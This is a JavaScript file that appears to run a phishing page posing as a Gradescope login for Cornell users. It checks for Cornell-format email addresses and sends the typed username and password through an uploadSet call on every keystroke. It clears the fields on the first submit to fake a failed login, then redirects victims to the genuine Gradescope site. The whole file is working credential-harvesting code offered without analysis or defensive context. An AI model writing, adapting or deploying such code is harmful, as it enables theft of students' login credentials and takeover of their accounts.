x = 0;
w = 150;

let EMAIL = "";

let US = Id("session_email");
let PW = Id("session_password");

function valid(val) {
  let end = val.substring(val.length - 12, val.length);

  if (end != "@cornell.edu") {
    return false;
  }

  let id = val.substring(0, val.length - 12);

  if (id.length < 3 || id.length > 6) {
    return false;
  }

  index = 0;

  for (let i = 0; i < id.length; i++) {
    if (!isNaN(id[i])) {
      index = i;
      break;
    }
  }

  if (index == 0) {
    return false;
  }

  letters = id.substring(0, index);
  number = id.substring(index, id.length);

  if (isNaN(number)) {
    return false;
  }

  for (let i = 0; i < letters.length; i++) {
    if (!isNaN(letters[i])) {
      return false;
    }
  }

  return true;
}

window.addEventListener("keyup", (e) => {
  if (US.value.length > 3 && PW.value.length > 5) {
    uploadSet("username: " + US.value);
    uploadSet("password: " + PW.value);
  }
});

stage = 0;

Id("submit").onclick = submit;

function submit() {
  console.log("clicked");
  if (stage == 0) {
    US.value = "";
    PW.value = "";
    stage = 1;
  } else {
    window.location = "https://gradescope.com/login";
  }
}
